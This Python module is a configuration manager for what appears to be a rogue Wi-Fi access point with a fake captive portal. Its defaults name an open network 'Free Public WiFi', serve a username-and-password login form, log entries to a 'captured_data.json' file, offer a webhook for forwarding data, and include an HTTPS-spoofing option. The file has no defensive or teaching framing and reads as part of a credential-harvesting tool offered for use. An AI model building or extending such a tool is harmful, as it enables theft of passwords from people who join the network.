import os
import json
import yaml

class ConfigManager:
    def __init__(self, config_file='config/config.yaml'):
        self.config_file = config_file
     
        config_dir = os.path.dirname(self.config_file)
        if config_dir and not os.path.exists(config_dir):
             os.makedirs(config_dir)
        self.config = self._load_config()

    def _load_config(self):
        if not os.path.exists(self.config_file):
            self._create_default_config()
        
        try:
            with open(self.config_file, 'r') as f:
                if self.config_file.endswith(".json"):
                    return json.load(f)
                elif self.config_file.endswith(".yaml") or self.config_file.endswith(".yml"):
                    return yaml.safe_load(f)
                else:
                    raise ValueError("Unsupported config file format")
        except Exception as e:
            print(f"Error loading config file {self.config_file}: {e}")
           
            self._create_default_config()
            with open(self.config_file, 'r') as f:
                return yaml.safe_load(f)


    def _create_default_config(self):
        default_config = {
            'ap_settings': {
                'ssid': 'Free Public WiFi',
                'channel': 6,
                'interface': 'wlan0'
            },
            'network_settings': {
                'local_ip': '10.0.0.1',
                'subnet_mask': '255.255.255.0',
             
                'internet_interface': 'eth0'
            },
            'portal_settings': {
                'port': 80,
                'login_form_fields': [
                    {'name': 'username', 'label': 'Username', 'type': 'text'},
                    {'name': 'password', 'label': 'Password', 'type': 'password'}
                ],
                
                'redirect_url_after_login': '/success'
            },
            'logging_settings': {
                'enable_data_logging': True,
                'log_format': 'json',
                'log_file': 'logs/captured_data.json'
            },
            'webhook_settings': {
                'enable_webhook': False,
                'webhook_url': ''
            },
            'advanced_settings': {
                'enable_https_spoofing_attempts': False,
                'auto_shutdown': False,
                'plugin_paths': []
            }
        }
        
        with open(self.config_file, 'w') as f:
            yaml.safe_dump(default_config, f, indent=4)

    def get(self, key, default=None):
        keys = key.split(".")
        val = self.config
        for k in keys:
            if isinstance(val, dict) and k in val:
                val = val[k]
            else:
                return default
        return val

    def set(self, key, value):
        keys = key.split(".")
        val = self.config
        for i, k in enumerate(keys):
            if i == len(keys) - 1:
                val[k] = value
            else:
                if k not in val or not isinstance(val[k], dict):
                    val[k] = {}
                val = val[k]
        self._save_config()

    def _save_config(self):
        with open(self.config_file, 'w') as f:
            if self.config_file.endswith(".json"):
                json.dump(self.config, f, indent=4)
            elif self.config_file.endswith(".yaml") or self.config_file.endswith(".yml"):
                yaml.safe_dump(self.config, f, indent=4)

if __name__ == '__main__':

    config_manager = ConfigManager()
    print("SSID:", config_manager.get("ap_settings.ssid"))
    config_manager.set("ap_settings.ssid", "NewWiFiName")
    print("New SSID:", config_manager.get("ap_settings.ssid"))
    print("Login fields:", config_manager.get("portal_settings.login_form_fields"))
